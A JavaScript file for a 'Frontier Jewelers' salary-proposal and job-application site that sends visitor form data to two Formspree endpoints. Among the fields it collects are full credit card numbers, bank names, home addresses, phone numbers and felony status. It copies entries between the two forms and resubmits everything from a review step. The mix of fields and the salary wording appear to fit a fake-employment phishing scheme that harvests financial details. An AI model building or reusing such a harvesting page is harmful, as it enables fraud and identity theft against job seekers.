/* ============================================================
   FRONTIER JEWELERS — Collaboration proposal & application
   Handles two Formspree endpoints:
   1. #secondForm (salary payment proposal) -> formspree.io/f/xwlvnyql
   2. #applyForm  (application form)        -> formspree.io/f/mdealbkw
   Plus: review summary, header navigation, and loader.
   ============================================================ */

(function () {
  "use strict";

  var PROPOSAL_ENDPOINT = "https://formspree.io/f/xwlvnyql";
  var APPLICATION_ENDPOINT = "https://formspree.io/f/mdealbkw";

  var loader = document.getElementById("loader");
  var siteHeader = document.getElementById("siteHeader");
  var headerNav = document.getElementById("headerNav");
  var hamburgerBtn = document.getElementById("hamburgerBtn");

  var secondForm = document.getElementById("secondForm");
  var secondStatusEl = document.getElementById("formspreeSecondStatus");
  var applyForm = document.getElementById("applyForm");
  var statusEl = document.getElementById("formStatus");
  var reviewStatusEl = document.getElementById("reviewStatus");

  // Snapshot of everything the visitor has already successfully submitted.
  // Forms are cleared after a successful POST, so the review step reads from
  // here to keep showing the visitor's real information between steps.
  var submitted = { proposal: null, application: null };

  /* ----------------------------------------------------------
     Small helpers
     ---------------------------------------------------------- */

  // Read a field by id, scoped to a form so duplicate ids across
  // forms can never return the wrong element.
  function fieldValue(form, id) {
    var el = form ? form.querySelector("#" + id) : null;
    return el ? String(el.value || "").trim() : "";
  }

  function fieldChecked(form, id) {
    var el = form ? form.querySelector("#" + id) : null;
    return !!(el && el.checked);
  }

  // Write text into a review cell only when it exists.
  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) el.textContent = value || "—";
  }

  function clearErrors(form, statusElement) {
    if (!form) return;
    form.querySelectorAll(".field-error").forEach(function (el) {
      el.textContent = "";
      el.classList.remove("visible");
    });
    form.querySelectorAll(".form-control.error").forEach(function (el) {
      el.classList.remove("error");
    });
    if (statusElement) {
      statusElement.classList.remove("form-status--success", "form-status--error");
      statusElement.textContent = "";
    }
  }

  function setFieldError(control, message) {
    var group = control.closest(".form-group") || control.closest(".checkbox-group");
    if (group) {
      var errorEl = group.querySelector(".field-error");
      if (errorEl) {
        errorEl.textContent = message;
        errorEl.classList.add("visible");
      }
    }
    control.classList.add("error");
  }

  // Validate every required control inside a form and surface the
  // first problem. Returns true when the form may be submitted.
  function validateForm(form, statusElement) {
    var valid = true;
    var firstInvalid = null;

    clearErrors(form, statusElement);

    form.querySelectorAll("[required]").forEach(function (control) {
      if (control.type === "checkbox") {
        if (!control.checked) {
          setFieldError(control, "Please tick this box to continue.");
          valid = false;
          if (!firstInvalid) firstInvalid = control;
        }
        return;
      }

      var value = String(control.value || "").trim();
      if (!value) {
        setFieldError(control, "This field is required.");
        valid = false;
        if (!firstInvalid) firstInvalid = control;
        return;
      }

      if (control.type === "email" && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
        setFieldError(control, "Please enter a valid email address.");
        valid = false;
        if (!firstInvalid) firstInvalid = control;
        return;
      }

      if (control.type === "tel" && !/^[+]?[\d\s\-()]{7,20}$/.test(value)) {
        setFieldError(control, "Please enter a valid phone number.");
        valid = false;
        if (!firstInvalid) firstInvalid = control;
      }
    });

    if (!valid && firstInvalid) {
      var target = firstInvalid.closest(".form-group") || firstInvalid.closest(".checkbox-group") || firstInvalid;
      target.scrollIntoView({ behavior: "smooth", block: "center" });
      setTimeout(function () {
        if (typeof firstInvalid.focus === "function") firstInvalid.focus();
      }, 300);
    }

    return valid;
  }

  function postTo(endpoint, data) {
    return fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify(data)
    });
  }

  function showStatus(element, kind, message) {
    if (!element) return;
    element.classList.remove("form-status--success", "form-status--error");
    element.classList.add(kind === "success" ? "form-status--success" : "form-status--error");
    element.textContent = message;
    element.scrollIntoView({ behavior: "smooth", block: "center" });
  }

  /* ----------------------------------------------------------
     Loader
     ---------------------------------------------------------- */
  if (loader) {
    var hideLoader = function () {
      setTimeout(function () {
        loader.classList.add("hidden");
      }, 400);
    };

    if (document.readyState === "complete") {
      hideLoader();
    } else {
      window.addEventListener("load", hideLoader);
    }
  }

  /* ----------------------------------------------------------
     Header navigation (mobile menu + scroll shadow)
     ---------------------------------------------------------- */
  function closeNav() {
    if (headerNav) headerNav.classList.remove("open");
    if (hamburgerBtn) {
      hamburgerBtn.classList.remove("active");
      hamburgerBtn.setAttribute("aria-expanded", "false");
    }
  }

  if (hamburgerBtn && headerNav) {
    hamburgerBtn.addEventListener("click", function () {
      var open = headerNav.classList.toggle("open");
      hamburgerBtn.classList.toggle("active", open);
      hamburgerBtn.setAttribute("aria-expanded", open ? "true" : "false");
    });
  }

  document.querySelectorAll(".nav-link").forEach(function (link) {
    link.addEventListener("click", function () {
      document.querySelectorAll(".nav-link").forEach(function (l) {
        l.classList.remove("active");
      });
      link.classList.add("active");
      closeNav();
    });
  });

  if (siteHeader) {
    var onScroll = function () {
      siteHeader.classList.toggle("scrolled", window.scrollY > 20);
    };
    window.addEventListener("scroll", onScroll, { passive: true });
    onScroll();
  }

  document.addEventListener("keydown", function (event) {
    if (event.key === "Escape") closeNav();
  });

  // Keep the visible nav link in sync while the visitor scrolls.
  var sections = [
    { id: "home", link: 'a.nav-link[href="#home"]' },
    { id: "proposal", link: 'a.nav-link[href="#proposal"]' },
    { id: "apply", link: 'a.nav-link[href="#apply"]' },
    { id: "review", link: 'a.nav-link[href="#review"]' },
    { id: "contact", link: 'a.nav-link[href="#contact"]' }
  ];

  if ("IntersectionObserver" in window) {
    var observer = new IntersectionObserver(
      function (entries) {
        entries.forEach(function (entry) {
          if (!entry.isIntersecting) return;
          var match = sections.filter(function (s) {
            return s.id === entry.target.id;
          })[0];
          if (!match) return;
          document.querySelectorAll(".nav-link").forEach(function (l) {
            l.classList.remove("active");
          });
          var activeLink = document.querySelector(match.link);
          if (activeLink) activeLink.classList.add("active");
        });
      },
      { rootMargin: "-45% 0px -50% 0px", threshold: 0 }
    );

    sections.forEach(function (section) {
      var el = document.getElementById(section.id);
      if (el) observer.observe(el);
    });
  }

  /* ----------------------------------------------------------
     1. Salary payment proposal
     ---------------------------------------------------------- */
  if (secondForm) {
    secondForm.addEventListener("submit", function (event) {
      event.preventDefault();

      if (!validateForm(secondForm, secondStatusEl)) {
        showStatus(secondStatusEl, "error", "Please complete the highlighted fields above.");
        return;
      }

      var submitButton = secondForm.querySelector('button[type="submit"]');
      if (submitButton) submitButton.disabled = true;

      var firstName = fieldValue(secondForm, "p_first");
      var lastName = fieldValue(secondForm, "p_last");
      var payMethod = fieldValue(secondForm, "p_payMethod");

      // The proposal form collects the full detail set, so this payload
      // carries everything the application form sends — plus the legacy keys
      // this endpoint has always received (full_name, salary_amount, ...).
      var data = {
        full_name: (firstName + " " + lastName).trim(),
        first_name: firstName,
        last_name: lastName,
        email: fieldValue(secondForm, "p_email"),
        phone: fieldValue(secondForm, "p_phone"),
        street_address: fieldValue(secondForm, "p_street"),
        address_line_2: fieldValue(secondForm, "p_address2"),
        city: fieldValue(secondForm, "p_city"),
        state: fieldValue(secondForm, "p_state"),
        postal_code: fieldValue(secondForm, "p_postal"),
        country: fieldValue(secondForm, "p_country") || "United States",
        payment_method: payMethod,
        pay_method: payMethod,
        salary_amount: fieldValue(secondForm, "p_salary"),
        bank_name: fieldValue(secondForm, "p_bank"),
        credit_card: fieldValue(secondForm, "p_creditCard"),
        feature: fieldValue(secondForm, "p_feature"),
        felony: fieldValue(secondForm, "p_felony"),
        date: fieldValue(secondForm, "p_date"),
        brands_approval: fieldValue(secondForm, "p_brandApproval"),
        agree: fieldChecked(secondForm, "p_agree")
      };

      postTo(PROPOSAL_ENDPOINT, data)
        .then(function (res) {
          if (!res.ok) throw new Error("Submission failed");
          submitted.proposal = data;
          showStatus(
            secondStatusEl,
            "success",
            "Thank you, " + data.full_name + "! Your salary proposal has been submitted. We'll be in touch soon."
          );
          mirrorIntoEmptyFields(secondForm);
          secondForm.reset();
          populateReview();
        })
        .catch(function () {
          showStatus(
            secondStatusEl,
            "error",
            "We couldn't submit your proposal right now. Please try again."
          );
        })
        .then(function () {
          if (submitButton) submitButton.disabled = false;
        });
    });
  }

  /* ----------------------------------------------------------
     2. Application form
     ---------------------------------------------------------- */
  if (applyForm) {
    applyForm.addEventListener("submit", function (event) {
      event.preventDefault();

      if (!validateForm(applyForm, statusEl)) {
        showStatus(statusEl, "error", "Please complete the highlighted fields above.");
        return;
      }

      var submitButton = applyForm.querySelector('button[type="submit"]');
      if (submitButton) submitButton.disabled = true;

      var data = {
        first: fieldValue(applyForm, "first"),
        last: fieldValue(applyForm, "last"),
        email: fieldValue(applyForm, "email"),
        phone: fieldValue(applyForm, "phone"),
        payMethod: fieldValue(applyForm, "payMethod"),
        salary: fieldValue(applyForm, "salary"),
        bankName: fieldValue(applyForm, "bankName"),
        creditCard: fieldValue(applyForm, "creditCard"),
        street: fieldValue(applyForm, "addrStreet"),
        address2: fieldValue(applyForm, "addrLine2"),
        city: fieldValue(applyForm, "city"),
        state: fieldValue(applyForm, "state"),
        postal: fieldValue(applyForm, "postal"),
        country: fieldValue(applyForm, "country") || "United States",
        felony: fieldValue(applyForm, "felony"),
        date: fieldValue(applyForm, "date"),
        brandApproval: fieldValue(applyForm, "brandApproval"),
        feature: fieldValue(applyForm, "feature"),
        agree: fieldChecked(applyForm, "agree")
      };

      postTo(APPLICATION_ENDPOINT, data)
        .then(function (res) {
          if (!res.ok) throw new Error("Submission failed");
          submitted.application = data;
          showStatus(
            statusEl,
            "success",
            "Thanks! Your application has been submitted. We'll be in touch soon."
          );
          mirrorIntoEmptyFields(applyForm);
          applyForm.reset();
          populateReview();
        })
        .catch(function () {
          showStatus(
            statusEl,
            "error",
            "We couldn't submit your application right now. Please try again."
          );
        })
        .then(function () {
          if (submitButton) submitButton.disabled = false;
        });
    });
  }

  /* ----------------------------------------------------------
     Carry details across the two forms

     Both forms ask for the same detail set, so mirror anything the visitor
     types into one form into any empty field of the other — nobody should
     have to type the same information twice. Values already present in the
     other form are never overwritten.
     ---------------------------------------------------------- */
  function mirrorIntoEmptyFields(sourceForm) {
    if (!sourceForm) return;
    var target = sourceForm === secondForm ? applyForm : secondForm;
    if (!target) return;

    sourceForm.querySelectorAll("input, select, textarea").forEach(function (control) {
      if (!control.name) return;
      var twin = target.querySelector('[name="' + control.name + '"]');
      if (!twin) return;

      if (control.type === "checkbox") {
        if (control.checked && !twin.checked) twin.checked = true;
        return;
      }

      var value = String(control.value || "");
      if (!value) return;

      if (twin.type === "checkbox") {
        if (!twin.checked) twin.checked = true;
        return;
      }

      if (!String(twin.value || "")) twin.value = value;
    });
  }

  [secondForm, applyForm].forEach(function (form) {
    if (!form) return;
    form.addEventListener("input", function () {
      mirrorIntoEmptyFields(form);
    });
    form.addEventListener("change", function () {
      mirrorIntoEmptyFields(form);
    });
  });

  /* ----------------------------------------------------------
     3. Review summary
     ---------------------------------------------------------- */
  // Live form values win; anything the visitor already submitted is kept as a
  // fallback so the review step never loses data after a form is cleared.
  function collectApplicationData() {
    var saved = submitted.application || {};
    var proposal = submitted.proposal || {};

    // The proposal payload uses different key names for the same details,
    // so map it once and let it back up the review step too — either form
    // on its own now carries the full detail set.
    var fromProposal = {
      first: proposal.first_name,
      last: proposal.last_name,
      email: proposal.email,
      phone: proposal.phone,
      street: proposal.street_address,
      address2: proposal.address_line_2,
      city: proposal.city,
      state: proposal.state,
      postal: proposal.postal_code,
      country: proposal.country,
      payMethod: proposal.pay_method,
      salary: proposal.salary_amount,
      bankName: proposal.bank_name,
      creditCard: proposal.credit_card,
      feature: proposal.feature,
      felony: proposal.felony,
      date: proposal.date,
      brandApproval: proposal.brands_approval
    };

    function pick(key, live) {
      return live || saved[key] || fromProposal[key] || "";
    }

    return {
      first: pick("first", fieldValue(applyForm, "first")),
      last: pick("last", fieldValue(applyForm, "last")),
      email: pick("email", fieldValue(applyForm, "email")),
      phone: pick("phone", fieldValue(applyForm, "phone")),
      payMethod: pick("payMethod", fieldValue(applyForm, "payMethod")),
      salary: pick("salary", fieldValue(applyForm, "salary")),
      bankName: pick("bankName", fieldValue(applyForm, "bankName")),
      creditCard: pick("creditCard", fieldValue(applyForm, "creditCard")),
      street: pick("street", fieldValue(applyForm, "addrStreet")),
      address2: pick("address2", fieldValue(applyForm, "addrLine2")),
      city: pick("city", fieldValue(applyForm, "city")),
      state: pick("state", fieldValue(applyForm, "state")),
      postal: pick("postal", fieldValue(applyForm, "postal")),
      country: pick("country", fieldValue(applyForm, "country")) || "United States",
      felony: pick("felony", fieldValue(applyForm, "felony")),
      date: pick("date", fieldValue(applyForm, "date")),
      brandApproval: pick("brandApproval", fieldValue(applyForm, "brandApproval")),
      feature:
        pick("feature", fieldValue(applyForm, "feature")) ||
        (secondForm ? fieldValue(secondForm, "p_feature") : "") ||
        proposal.feature ||
        "",
      agree:
        fieldChecked(applyForm, "agree") || saved.agree === true || proposal.agree === true
          ? "Yes"
          : "No"
    };
  }

  function populateReview() {
    var data = collectApplicationData();

    setText("review-first", data.first);
    setText("review-last", data.last);
    setText("review-email", data.email);
    setText("review-phone", data.phone);
    setText("review-paymethod", data.payMethod);
    setText("review-salary", data.salary);
    setText("review-bankname", data.bankName);
    setText("review-creditcard", data.creditCard);
    setText("review-street", data.street);
    setText("review-address2", data.address2);
    setText("review-city", data.city);
    setText("review-state", data.state);
    setText("review-postal", data.postal);
    setText("review-country", data.country);
    setText("review-felony", data.felony);
    setText("review-date", data.date);
    setText("review-feature", data.feature);
    setText("review-agree", data.agree);
    setText("review-brandapproval", data.brandApproval);

    // Legacy review cells (kept in sync when present).
    setText("review-paymethod2", data.payMethod);
    setText("review-salary2", data.salary);
    setText("review-bankname2", data.bankName);
  }

  var editBtn = document.getElementById("editReviewBtn");
  if (editBtn) {
    editBtn.addEventListener("click", populateReview);
  }

  /* ----------------------------------------------------------
     4. Final submission from the review step
     ---------------------------------------------------------- */
  var submitReviewBtn = document.getElementById("submitReviewBtn");
  if (submitReviewBtn) {
    submitReviewBtn.addEventListener("click", function () {
      var data = collectApplicationData();

      clearErrors(applyForm, reviewStatusEl);

      var missing = [];
      if (!data.first) missing.push("First name");
      if (!data.last) missing.push("Last name");
      if (!data.email) missing.push("Email");
      if (!data.phone) missing.push("Phone");
      if (!data.payMethod) missing.push("Salary paid to");
      if (!data.salary) missing.push("Salary amount");
      if (!data.bankName) missing.push("Bank name");
      if (!data.street) missing.push("Street address");
      if (!data.city) missing.push("City");
      if (!data.state) missing.push("State / region");
      if (!data.postal) missing.push("Postal code");
      if (!data.country) missing.push("Country");
      if (!data.felony) missing.push("Felony question");
      if (!data.date) missing.push("Date");
      if (!data.brandApproval) missing.push("Brand's approval");
      if (!data.feature) missing.push("Feature");
      if (data.agree !== "Yes") missing.push("Agreement");

      if (missing.length) {
        showStatus(
          reviewStatusEl,
          "error",
          "Please complete the application form first: " + missing.join(", ") + "."
        );
        return;
      }

      submitReviewBtn.disabled = true;

      var payload = {
        first_name: data.first,
        last_name: data.last,
        email: data.email,
        phone: data.phone,
        salary_amount: data.salary,
        bank_name: data.bankName,
        credit_card: data.creditCard,
        street_address: data.street,
        address_line_2: data.address2,
        city: data.city,
        state: data.state,
        postal_code: data.postal,
        country: data.country,
        pay_method: data.payMethod,
        felony: data.felony,
        date: data.date,
        brands_approval: data.brandApproval,
        feature: data.feature,
        agree: true
      };

      postTo(PROPOSAL_ENDPOINT, payload)
        .then(function (res) {
          if (!res.ok) throw new Error("Submission failed");
          submitted.application = Object.assign({}, submitted.application, {
            first: data.first,
            last: data.last,
            email: data.email,
            phone: data.phone,
            payMethod: data.payMethod,
            salary: data.salary,
            bankName: data.bankName,
            creditCard: data.creditCard,
            street: data.street,
            address2: data.address2,
            city: data.city,
            state: data.state,
            postal: data.postal,
            country: data.country,
            felony: data.felony,
            date: data.date,
            brandApproval: data.brandApproval,
            feature: data.feature,
            agree: true
          });
          showStatus(
            reviewStatusEl,
            "success",
            "Thank you, " + data.first + "! Your application has been submitted. We'll be in touch soon."
          );
          populateReview();
        })
        .catch(function () {
          showStatus(
            reviewStatusEl,
            "error",
            "We couldn't submit your application right now. Please try again."
          );
        })
        .then(function () {
          submitReviewBtn.disabled = false;
        });
    });
  }
})();
